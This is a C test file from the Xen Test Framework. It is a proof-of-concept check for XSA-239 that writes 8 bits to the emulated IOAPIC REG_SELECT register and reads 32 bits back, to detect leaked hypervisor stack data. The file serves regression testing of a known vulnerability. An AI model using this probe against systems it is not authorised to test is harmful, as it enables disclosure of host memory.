/**
 * @file tests/xsa-239/main.c
 * @ref test-xsa-239
 *
 * @page test-xsa-239 XSA-239
 *
 * Advisory: [XSA-239](http://xenbits.xen.org/xsa/advisory-239.html)
 *
 * The IOAPIC REG_SELECT register is an 8bit register, which is expected to be
 * accessed with 32bit accesses.
 *
 * Before XSA-239, the emulated IOAPIC code read 32 bits passed to it, even
 * though only 8 bits had been initialised.  The upper 24 bits of stack rubble
 * is then retrievable via a 32bit read of the REG_SELECT register.
 *
 * @see tests/xsa-239/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-239 PoC";

void test_main(void)
{
    uint32_t *io_apic_32 = _p(IOAPIC_DEFAULT_BASE);
    uint8_t  *io_apic_8 =  _p(IOAPIC_DEFAULT_BASE);
    unsigned int i;

    /*
     * Retry several times.  It is plausible that the stack rubble happens to
     * be zeroes.
     */
    for ( i = 0; i < 20; ++i )
    {
        ACCESS_ONCE(io_apic_8[0]) = 0;

        uint32_t val = ACCESS_ONCE(io_apic_32[0]);

        /*
         * Cope with an IOAPIC not being present, and the IO being terminated
         * as ~0u by the default no-op handler.
         */
        if ( val != 0 && val != ~0u )
        {
            printk("Data leaked via IO_APIC REG_SELECT: %08x\n", val);
            return xtf_failure("Fail: Vulnerable to XSA-239\n");
        }

        hypercall_yield();
    }

    xtf_success("Success: Probably not vulnerable to XSA-239\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
